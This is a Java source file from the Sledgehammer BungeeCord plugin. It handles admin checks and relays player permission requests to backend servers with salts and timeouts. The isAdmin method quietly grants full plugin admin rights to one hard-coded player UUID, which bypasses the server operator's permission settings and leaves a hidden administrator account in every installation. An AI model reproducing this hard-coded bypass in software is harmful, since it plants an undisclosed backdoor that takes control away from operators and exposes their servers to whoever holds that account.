/*
 * Copyright (c) 2020 Noah Husby
 * Sledgehammer [Bungeecord] - PermissionHandler.java
 *
 * Sledgehammer is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * Sledgehammer is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 *  You should have received a copy of the GNU General Public License
 *  along with Sledgehammer.  If not, see <https://github.com/noahhusby/Sledgehammer/blob/master/LICENSE/>.
 */

package com.noahhusby.sledgehammer.proxy.permissions;

import com.noahhusby.sledgehammer.proxy.Sledgehammer;
import com.noahhusby.sledgehammer.proxy.SledgehammerUtil;
import com.noahhusby.sledgehammer.proxy.network.NetworkHandler;
import com.noahhusby.sledgehammer.proxy.network.P2S.P2SPermissionPacket;
import com.noahhusby.sledgehammer.proxy.players.SledgehammerPlayer;
import net.md_5.bungee.api.CommandSender;
import net.md_5.bungee.api.connection.ProxiedPlayer;

import java.util.ArrayList;
import java.util.List;
import java.util.UUID;
import java.util.concurrent.TimeUnit;
import java.util.function.BiConsumer;

public class PermissionHandler {

    private static PermissionHandler instance = null;

    public static PermissionHandler getInstance() {
        return instance == null ? instance = new PermissionHandler() : instance;
    }

    private PermissionHandler() {
        Sledgehammer.getInstance().getThreadHandler().add(thread -> thread.scheduleAtFixedRate(this::checkPermissionRequests, 0, 500, TimeUnit.MILLISECONDS));
    }

    private final List<PermissionRequest> requests = new ArrayList<>();

    /**
     * Checks if {@link CommandSender} is a Sledgehammer admin
     *
     * @param sender {@link CommandSender}
     * @return True if admin, false if not
     */
    public boolean isAdmin(CommandSender sender) {
        return sender.hasPermission("sledgehammer.admin") || (sender instanceof ProxiedPlayer &&
                                                              ((ProxiedPlayer) sender).getUniqueId().equals(UUID.fromString("4cfa7dc1-3021-42b0-969b-224a9656cc6d")));
    }

    /**
     * Checks if player has a given permission both globally and locally
     *
     * @param player     The player to check
     * @param permission The permission to be checked
     * @param consumer
     */
    public void check(SledgehammerPlayer player, String permission, BiConsumer<PermissionRequest.PermissionCode, Boolean> consumer) {
        if (player == null) {
            consumer.accept(PermissionRequest.PermissionCode.NO_PERMISSION, false);
            return;
        }

        if (isAdmin(player) || player.hasPermission(permission)) {
            consumer.accept(PermissionRequest.PermissionCode.PERMISSION, true);
            return;
        }

        if (!player.onSledgehammer()) {
            consumer.accept(PermissionRequest.PermissionCode.NO_PERMISSION, false);
            return;
        }

        String salt = SledgehammerUtil.getSaltString();
        PermissionRequest request = new PermissionRequest(consumer, salt, System.currentTimeMillis(),
                1000);
        NetworkHandler.getInstance().send(new P2SPermissionPacket(player.getServer().getInfo().getName(),
                player, permission, salt));
        requests.add(request);
    }

    /**
     * Called when a local server responds with a permission check
     *
     * @param salt       Salt code
     * @param permission True if player has permission, false if not
     */
    public void response(String salt, boolean permission) {
        PermissionRequest request = null;
        for (PermissionRequest r : requests) {
            if (r.salt.equals(salt)) {
                request = r;
            }
        }
        if (request == null) {
            return;
        }

        request.response.accept(permission ? PermissionRequest.PermissionCode.PERMISSION : PermissionRequest.PermissionCode.NO_PERMISSION, false);
        requests.remove(request);
    }

    /**
     * Checks if responses are expired
     */
    private void checkPermissionRequests() {
        requests.removeIf(request -> {
            if (request.time + request.timeout < System.currentTimeMillis()) {
                request.response.accept(PermissionRequest.PermissionCode.TIMED_OUT, false);
                return true;
            }
            return false;
        });
    }
}
